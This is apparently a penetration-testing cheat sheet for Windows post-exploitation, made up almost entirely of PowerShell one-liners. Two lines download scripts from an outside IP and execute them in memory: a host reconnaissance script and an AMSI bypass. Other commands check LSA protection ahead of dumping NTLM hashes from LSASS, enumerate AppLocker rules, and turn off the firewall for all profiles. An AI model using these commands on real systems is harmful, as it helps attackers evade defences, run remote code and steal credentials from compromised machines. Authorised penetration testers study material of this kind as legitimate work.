# Post Exploitation

## Generic

Run Hostrecon.ps1

{% code overflow="wrap" %}
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.119.120/HostRecon.ps1') | IEX
Invoke-HostRecon
```
{% endcode %}

Check for LSA protection

If LSA protection is enabled you cannot directly obtain NTLM hashes from LSASS

```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

Enumerate AppLocker rules for executable files

```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

AMSI Bypass

{% code overflow="wrap" %}
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.119.120/amsi.txt') | IEX
```
{% endcode %}

Disable Firewall

```powershell
NetSh Advfirewall set allprofiles state off
```
